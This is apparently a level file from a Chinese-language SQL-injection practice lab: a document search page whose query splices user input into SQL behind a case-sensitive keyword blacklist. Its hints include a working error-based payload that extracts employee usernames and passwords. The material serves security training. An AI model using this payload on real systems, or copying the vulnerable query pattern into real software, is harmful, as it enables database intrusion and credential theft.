<?php
// Less-27 公文检索
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '公文检索',
  'desc'  => '按关键词检索公文库。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'id' => '检索词',
), 'submit' => '查 询'],
  'difficulty' => 4,
  'task' => 'union / select 的常见大小写都被过滤，组合绕过后完成报错注入',
  'hints' => array (
  0 => '过滤名单逐个删除 union/select 的多种写法——删除一次后，剩下的字符会重新组合。',
  1 => '大小写混合双写：uniOn SeLECT；空格用 %0a。',
  2 => '示例：?id=1\'%0aand%0aextractvalue(1,concat(0x7e,(select%0agroup_concat(username,0x3a,password)%0afrom%0aoa_employee),0x7e))%0aand%0a\'1\'=\'1',
),
  'run' => function ($app) {
    if (!isset($_GET['id'])) return $app->info('请输入检索词。');
    $id = $_GET['id'];
    $id = preg_replace('/[\\/\\*]/', '', $id);
    $id = preg_replace('/[--]/', '', $id);
    $id = preg_replace('/[#]/', '', $id);
    $id = preg_replace('/[ +]/', '', $id);
    $id = preg_replace('/select/m', '', $id);
    $id = preg_replace('/union/s', '', $id);
    $id = preg_replace('/UNION/s', '', $id);
    $id = preg_replace('/SELECT/s', '', $id);
    $id = preg_replace('/Union/s', '', $id);
    $id = preg_replace('/Select/s', '', $id);
    $sql = "SELECT id, title, content FROM oa_notice WHERE id='{$id}' LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->card(['公文标题' => $row['title'], '正文内容' => $row['content']]);
    }
    return $app->note($app->error());
  },
];
